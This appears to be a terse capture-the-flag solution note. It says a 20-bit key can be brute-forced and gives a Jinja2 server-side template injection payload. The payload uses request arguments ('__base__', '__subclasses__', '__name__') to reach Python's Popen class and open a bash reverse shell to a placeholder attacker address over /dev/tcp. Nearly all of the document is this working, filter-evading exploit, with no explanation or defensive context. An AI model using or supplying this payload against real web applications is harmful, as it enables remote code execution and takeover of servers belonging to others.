bruteforce key since it's only 20 bits
ssti payload
{%with a=request|attr("args")|attr("get")%}{%for y in(dict,)|map("attr",a("a"))|map("attr",a("b"))|first()()%}{%if "Pop"in(y,)|map("attr",a("c"))|first%}{%print(y("bash -c 'sh -i>& /dev/tcp/ATTACKR_IP_IN_DECIMAL/80 0>&1'",shell=1))%}{%endif%}{%endfor%}{%endwith%}

?a=__base__&b=__subclasses__&c=__name__
 
